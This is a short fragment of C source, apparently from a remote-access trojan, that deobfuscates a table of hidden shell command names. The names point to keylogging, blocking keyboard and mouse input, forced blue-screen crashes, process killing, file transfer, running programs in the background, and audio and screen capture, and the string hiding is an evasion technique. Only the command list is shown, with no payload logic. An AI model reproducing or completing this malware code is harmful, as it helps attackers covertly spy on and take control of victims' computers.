	UNHIDE_STRING(SHELL_STRING_CMD_STOPMP3);
	UNHIDE_STRING(SHELL_STRING_CMD_SS);
	UNHIDE_STRING(SHELL_STRING_CMD_SSSF);
	UNHIDE_STRING(SHELL_STRING_CMD_MSG);
	UNHIDE_STRING(SHELL_STRING_CMD_LP);
	UNHIDE_STRING(SHELL_STRING_CMD_KILL);
	UNHIDE_STRING(SHELL_STRING_CMD_CMON);
	UNHIDE_STRING(SHELL_STRING_CMD_CMOFF);
	UNHIDE_STRING(SHELL_STRING_CMD_KBDON);
	UNHIDE_STRING(SHELL_STRING_CMD_KBDOFF);
	UNHIDE_STRING(SHELL_STRING_CMD_ATKON);
	UNHIDE_STRING(SHELL_STRING_CMD_ATKOFF);
	UNHIDE_STRING(SHELL_STRING_CMD_BION);
	UNHIDE_STRING(SHELL_STRING_CMD_BIOFF);
	UNHIDE_STRING(SHELL_STRING_CMD_BIEON);
	UNHIDE_STRING(SHELL_STRING_CMD_FMUON);
	UNHIDE_STRING(SHELL_STRING_CMD_FMUOFF);
	UNHIDE_STRING(SHELL_STRING_CMD_BIEOFF);
	UNHIDE_STRING(SHELL_STRING_CMD_OPENCLIP);
	UNHIDE_STRING(SHELL_STRING_CMD_CLOSECLIP);
	UNHIDE_STRING(SHELL_STRING_CMD_SK);
	UNHIDE_STRING(SHELL_STRING_CMD_REC);
	UNHIDE_STRING(SHELL_STRING_CMD_RECBG);
	UNHIDE_STRING(SHELL_STRING_CMD_BSOD);
	UNHIDE_STRING(SHELL_STRING_CMD_KL);
	UNHIDE_STRING(SHELL_STRING_CMD_KLSTOP);
	UNHIDE_STRING(SHELL_STRING_CMD_KLCLEAN);
	UNHIDE_STRING(SHELL_STRING_CMD_LKL);
	UNHIDE_STRING(SHELL_STRING_CMD_LKLSTOP);
	UNHIDE_STRING(SHELL_STRING_CMD_LKLCLEAN);
	UNHIDE_STRING(SHELL_STRING_CMD_SF);
	UNHIDE_STRING(SHELL_STRING_CMD_RF);
	UNHIDE_STRING(SHELL_STRING_CMD_SFBG);
	UNHIDE_STRING(SHELL_STRING_CMD_RFBG);
	UNHIDE_STRING(SHELL_STRING_CMD_RUN);
	UNHIDE_STRING(SHELL_STRING_CMD_BG);
	UNHIDE_STRING(SHELL_STRING_CMD_PROC);
	UNHIDE_STRING(SHELL_STRING_CMD_PROCBG);
	UNHIDE_STRING(SHELL_STRING_CMD_BP);
	UNHIDE_STRING(SHELL_STRING_CMD_USER);
	UNHIDE_STRING(SHELL_STRING_CMD_KEYLOG);
}